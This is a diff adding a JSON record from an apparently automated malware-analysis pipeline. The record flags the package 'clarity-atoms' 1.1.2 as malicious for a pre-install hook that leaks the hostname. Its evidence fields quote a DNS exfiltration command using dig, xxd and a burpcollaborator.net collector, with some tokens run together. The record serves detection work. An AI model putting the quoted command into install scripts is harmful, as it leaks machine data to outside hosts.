@@ -1,0 +1,54 @@
+{
+  "package_name": "clarity-atoms",
+  "version": "1.1.2",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "data_exfiltration"
+    ],
+    "behaviors": [
+      {
+        "category": "data_exfiltration",
+        "summary": "The package contains a pre-install hook that exfiltrates data.",
+        "details": "The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname.",
+        "confidence": 0.97,
+        "evidence_commands": [
+          "echotest",
+          "dig `xxd-p/etc/hostname`.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": ""
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "chain_narrative": "The package contains a pre-install hook that exfiltrates data. The pre-install hook contains commands that perform data exfiltration. The commands include 'echotest' and 'dig' followed by a command to read the hostname. The exfiltrated data is sent to a domain known to be associated with webhook/exfiltration collectors.",
+      "attack_vector": [
+        "echotest",
+        "dig",
+        "xxd-p/etc/hostname.k4patrwflxsxghdt6a9g2yoei5owcl.burpcollaborator.net"
+      ],
+      "chain_score": 0.97,
+      "verdict": "MALICIOUS",
+      "confidence": 0.97
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": ""
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "flag",
+    "structural_risk_score": 0.9693,
+    "confirmed_signals_count": 2,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T13:13:56.262555"
+}
